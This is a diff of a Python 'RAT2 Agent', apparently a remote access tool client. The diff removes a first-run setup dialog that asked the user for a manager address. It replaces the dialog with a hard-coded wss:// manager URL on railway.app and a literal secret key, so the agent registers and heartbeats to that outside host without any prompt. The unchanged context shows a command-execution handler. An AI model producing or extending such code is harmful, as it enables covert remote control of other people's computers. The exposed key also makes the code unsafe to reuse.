@@ -13,148 +13,15 @@ import websockets
 
 FROZEN   = getattr(sys, "frozen", False)
 BASE_DIR = Path(sys.executable).parent if FROZEN else Path(__file__).parent
+ID_FILE  = BASE_DIR / ".rat2_agent_id"
 
-CONFIG_FILE = BASE_DIR / ".rat2_config"
-ID_FILE     = BASE_DIR / ".rat2_agent_id"
-DEFAULT_KEY = "Zu6_4hEGklhBBQzHYjj1-0n2hbvr-6cuu4huzkufhZQ"
+# ── Baked-in config ───────────────────────────────────────────────────────────
+MANAGER_URL = "wss://manager-production-08f2.up.railway.app/ws/agent"
+SECRET_KEY  = "Zu6_4hEGklhBBQzHYjj1-0n2hbvr-6cuu4huzkufhZQ"
+LOCATION    = socket.gethostname()
 HEARTBEAT_INTERVAL = 5
+# ─────────────────────────────────────────────────────────────────────────────
 
-
-# ── Config ────────────────────────────────────────────────────────────────────
-
-def load_config():
-    if not CONFIG_FILE.exists():
-        return None
-    cfg = {}
-    for line in CONFIG_FILE.read_text(encoding="utf-8").splitlines():
-        if "=" in line:
-            k, v = line.split("=", 1)
-            cfg[k.strip()] = v.strip()
-    url = cfg.get("url", "")
-    if not url or "YOUR-IP" in url:
-        return None
-    return url, cfg.get("key", DEFAULT_KEY), cfg.get("location", socket.gethostname())
-
-
-def save_config(url, key, location):
-    CONFIG_FILE.write_text(
-        f"url={url}\nkey={key}\nlocation={location}\n", encoding="utf-8"
-    )
-
-
-def _powershell_input(prompt, title, default=""):
-    """Windows InputBox via PowerShell — no extra dependencies."""
-    script = (
-        "Add-Type -AssemblyName Microsoft.VisualBasic; "
-        f"[Microsoft.VisualBasic.Interaction]::InputBox('{prompt}', '{title}', '{default}')"
-    )
-    r = subprocess.run(
-        ["powershell", "-NonInteractive", "-Command", script],
-        capture_output=True, text=True, timeout=120,
-    )
-    return r.stdout.strip()
-
-
-def run_setup():
-    """Prompt user for manager URL and location label, return (url, location)."""
-    # Try tkinter first; fall back to PowerShell InputBox.
-    try:
-        import tkinter as tk
-        from tkinter import font as tkfont
-
-        result = {}
-
-        root = tk.Tk()
-        root.title("RAT2 Agent — First Run Setup")
-        root.configure(bg="#0d1117")
-        root.resizable(False, False)
-
-        W, H = 480, 310
-        root.update_idletasks()
-        sw = root.winfo_screenwidth()
-        sh = root.winfo_screenheight()
-        root.geometry(f"{W}x{H}+{(sw-W)//2}+{(sh-H)//2}")
-
-        BG, PANEL, BORD = "#0d1117", "#161b22", "#30363d"
-        ACCENT, TEXT, MUTED = "#58a6ff", "#e6edf3", "#8b949e"
-
-        tf = tkfont.Font(family="Segoe UI", size=15, weight="bold")
-        sf = tkfont.Font(family="Segoe UI", size=10)
-        ef = tkfont.Font(family="Consolas", size=11)
-        bf = tkfont.Font(family="Segoe UI", size=11, weight="bold")
-
-        tk.Label(root, text="RAT2 Agent", font=tf, bg=BG, fg=ACCENT).pack(pady=(22, 4))
-        tk.Label(root, text="Enter your manager details once — this won't appear again.",
-                 font=sf, bg=BG, fg=MUTED).pack(pady=(0, 18))
-
-        frame = tk.Frame(root, bg=BG)
-        frame.pack(padx=44, fill="x")
-
-        def field(label, default):
-            tk.Label(frame, text=label, font=sf, bg=BG, fg=MUTED, anchor="w").pack(fill="x")
-            var = tk.StringVar(value=default)
-            e = tk.Entry(frame, textvariable=var, font=ef, bg=PANEL, fg=TEXT,
-                         insertbackground=TEXT, relief="flat", bd=0,
-                         highlightthickness=1, highlightbackground=BORD,
-                         highlightcolor=ACCENT)
-            e.pack(fill="x", ipady=7, pady=(2, 12))
-            return var
-
-        url_var = field("Manager URL", "ws://YOUR-IP:8080/ws/agent")
-        loc_var = field("Location label (optional)", socket.gethostname())
-
-        err_lbl = tk.Label(root, text="", font=sf, bg=BG, fg="#f85149")
-        err_lbl.pack()
-
-        def on_save():
-            url = url_var.get().strip()
-            loc = loc_var.get().strip() or socket.gethostname()
-            if not url or "YOUR-IP" in url:
-                err_lbl.config(text="Please enter a valid manager URL.")
-                return
-            result["url"]      = url
-            result["location"] = loc
-            root.destroy()
-
-        tk.Button(root, text="Connect", font=bf, bg=ACCENT, fg="#000",
-                  relief="flat", bd=0, padx=28, pady=9, cursor="hand2",
-                  command=on_save).pack(pady=(0, 22))
-
-        root.mainloop()
-        if not result:
-            return None, None
-        return result["url"], result["location"]
-
-    except Exception:
-        # Fallback: PowerShell InputBox
-        url = _powershell_input(
-            "Enter manager URL (e.g. ws://192.168.1.10:8080/ws/agent):",
-            "RAT2 Agent Setup",
-            "ws://",
-        )
-        if not url or "YOUR-IP" in url or not url.startswith("ws"):
-            return None, None
-        loc = _powershell_input("Enter location label (leave blank for hostname):",
-                                "RAT2 Agent Setup", socket.gethostname())
-        return url, loc or socket.gethostname()
-
-
-# ── Boot ──────────────────────────────────────────────────────────────────────
-
-cfg = load_config()
-if not cfg:
-    url, location = run_setup()
-    if not url:
-        sys.exit(0)
-    save_config(url, DEFAULT_KEY, location)
-    cfg = load_config()
-    if not cfg:
-        sys.exit(1)
-
-MANAGER_URL, SECRET_KEY, LOCATION = cfg
-
-
-# ── Agent ID ──────────────────────────────────────────────────────────────────
 
 def load_or_create_id():
     if ID_FILE.exists():
@@ -168,8 +35,6 @@ def load_or_create_id():
 AGENT_ID = load_or_create_id()
 
 
-# ── Helpers ───────────────────────────────────────────────────────────────────
-
 def local_ip():
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -181,8 +46,7 @@ def local_ip():
         return socket.gethostbyname(socket.gethostname())
 
 def manager_http_base():
-    url = MANAGER_URL.replace("wss://", "https://").replace("ws://", "http://")
-    return url.split("/ws/agent")[0]
+    return MANAGER_URL.replace("wss://", "https://").replace("ws://", "http://").split("/ws/agent")[0]
 
 def self_hash():
     return hashlib.sha256(Path(sys.executable if FROZEN else __file__).read_bytes()).hexdigest()
@@ -201,8 +65,6 @@ def registration_msg():
         "agent_hash": self_hash(),
     }
 
-
-# ── Command handlers ──────────────────────────────────────────────────────────
 
 def _exec(cmd):
     try:
@@ -396,8 +258,6 @@ def _heartbeat_stats():
         "disk": disk_pct,
     }
 
-
-# ── Async loops ───────────────────────────────────────────────────────────────
 
 async def heartbeat_loop(ws):
     loop = asyncio.get_running_loop()
